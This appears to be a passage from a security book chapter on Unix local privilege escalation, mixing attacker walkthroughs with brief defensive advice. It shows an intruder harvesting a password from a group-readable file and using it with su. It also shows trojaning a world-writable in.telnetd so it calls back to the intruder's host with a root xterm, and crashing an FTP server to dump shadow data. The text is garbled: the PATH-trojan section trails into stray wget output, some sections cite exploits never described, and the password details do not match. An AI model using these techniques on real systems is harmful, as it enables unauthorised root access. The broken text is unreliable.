## EXPLOITING LOCAL TRUST

Any vulnerabilities allow intruders to gain nonprivileged access to remote hosts. After obtaining normal user privileges, the next logical step for an intruder is to gain root (superuser) access. In addition to external intruders, malicious users may also attempt to exploit local vulnerabilities in order to obtain superuser privileges.

The act of elevating privileges to that of the superuser is usually referred to as privilege escalation. This chapter describes various methods an individual with normal user privileges may attempt to obtain superuser privileges.

In most cases, firewalls are configured to restrict access from external hosts and networks. Traffic on the loopback interface (127.0.0.1) is often unrestricted. In fact, filtering traffic on the loopback interface may cause many applications to break. A local user may use this condition to his advantage and attempt to scan, enumerate, and exploit services that aren’t accessible remotely. Therefore, once an attacker has gained local user access to a host, he or she may attempt all the hacking techniques described in the previous chapters of this book in order to escalate privileges.

## GROUP MEMBERSHIP AND INCORRECT FILE PERMISSIONS

Incorrect file permissions may allow a malicious user to read or write to files that they do not have access to. The following sections describe how a malicious user may exploit incorrect file permissions to escalate his or her privileges.

### Find Group-Owned Files

Suppose an intruder has gained access to the local account “joe.” He or she may find out all the groups “joe” belongs to issuing the id command:

```bash
[bash]$ id
uid=500(joe) gid=500(joe) groups=500(joe),501(proj1)
```

After noticing that "joe" belongs to the group "proj1," the intruder may issue the following command, which will list all the files owned by the "proj1" group:

```bash
$bash$ find / -group proj1 -print 2> /dev/null
/var/proj1/main.c
/var/proj1/main.o
/var/proj1/README
/var/proj1/pass.txt
/var/log/proji
```

Now, the intruder knows exactly what "proj1" files "joe" has access to. One of these files, pass.txt, may seem pretty interesting:

```bash
$bash$ more /var/proj1/pass.txt
Note that this program authenticates to the MySQL database with the system password "r00t3rp455.w."
```

Administrators often reuse passwords. If the victim's root password was the same as the MySQL password shown in the preceding note, the intruder may gain root privileges by issuing the command:

```bash
$bash$ su
Password:r00t3rp455
$bash# id
uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4 (adm), 6(disk), 10(wheel)
```

### Find World-Readable and -Writable Files

In addition to searching for world-readable files, it is also possible to search for world-readable files that a user may have access to. For example, here is how you would search for all world-readable files present in the /etc directory:

```bash
$bash$ find /etc -type f -perm -4 -print 2> /dev/null
```

Many files in /etc should not be world-readable. For example, the /etc/shadow file contains encrypted passwords of users. Anyone with access to this file may use brute-force crack user passwords using tools like John the Ripper.

An intruder may attempt to search for world-writable files by issuing the following command:

```bash
$bash$ find / -type f -perm -2 -print 2> /dev/null
/usr/sbin/in.telnetd
```

In this example, the intruder’s “joe” account has write permissions to in.telnetd. The inetd or xinetd service on the victim host will invoke in.telnetd file every incoming telnet connection is made to the host. The intruder may edit the in.telnetd file and place the following contents in it:

```bash
#!/bin/bash
xterm -display intruder’s_ip_address:0.0 &
```

Now, the intruder may execute the following on his or her host:
xhost +victim_s_ip_address

This gives the victim machine to display an X program on the intruder’s server. All the intruder needs to do is to connect to the telnet host, which will make inetd or xinetd invoke /usr/sbin/in.telnetd with root privileges, calling a root xterm from the victim host to be presented to the intruder!

### Ensure Proper Permissions

Routinely audit files to ensure proper file permissions.

## ":" IN PATH

When a user executes a command, the command shell searches for the location of the command in the list of directories contained in the PATH environment variable:

```bash
[bash]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/home/joe:/bin
```

Suppose the root user has the current directory (“.”) in his PATH:
:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin

Now, every root user executes a command such as ls, the first looks for “ls” in the current directory, and then it searches the other directories as listed in the PATH variable.

### Exploit “.: in PATH to Plant Trojans

A malicious user or intruder who has access to a local account such as “joe” may create a file called “ls” and place it in the victim user’s home directory (/home/joe) with the following contents:

Resolving intruder's_web_server... done.
Connecting to intruder's_web_server[10.0.0.1]:80... connected.
HTTP request sent, awaiting response... 200 OK

## Update or Patch the Kernel

Usually, patches for kernel vulnerabilities are promptly released by the kernel developers. Make sure to install patches immediately before they are exposed to malicious users.

The ipcs program susceptible to this vulnerability could be exploited by local users to gain root privileges.

## Improper Input Validation

It is very important to perform input validation on programs that accept input. Setuid programs execute with the privileges of the root user, and therefore a minor input validation flaw may allow a local user to execute commands with root privileges.

As an example, consider the runpr utility, which was found to be vulnerable to input validation.

## Symbolic Links

**Symbolic links** are special files that contain pathnames to other files. When a program attempts to access a file that is a symbolic link, the kernel transparently redirects the process to the filename the symbolic link refers to.

Although symbolic links are a useful feature, they can be used to exploit vulnerable programs that do not check if the files are symbolic links. For example, the CDE Tooltalk symbolic link vulnerability, which failed to check if the log file being written to a symbolic link. An attacker may create a symbolic link to /etc/shadow whose name and path are the same as those of the log created by Tooltalk. This will cause Tooltalk to write its log to /etc/shadow, causing its contents to become corrupted. an attacker were successful in forcing specific contents to be written to sensitive files she could abuse these vulnerabilities to obtain elevated privileges.

## Core Dumps

When a Unix or Linux system crashes, a “core” file is created by the operating system. This file contains information about the crashed process. Core files are used by developers to debug software. Since core files contain details about the crashed process, an intruder may purposefully exploit a known vulnerability in order to crash a running process to obtain sensitive information that may be placed in the core file.

### Solaris FTP Core Dump Shadow File Recovery Vulnerability

The FTP server distributed in older versions of Solaris was known to place parts of /etc/shadow in its core file when forced to crash using the following command:

```CWD ~
```

After crashing the FTP server process using this command, the intruder may obtain the core file dumped in order to obtain parts of the /etc/shadow file. Here is a sample session that attempts to this:

```bash
[bash]$ telnet 127.0.0.1 21
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^'.
220 127.0.0.1 FTP server (SunOS 5.6) ready
user joe
331 Password required for joe.
```
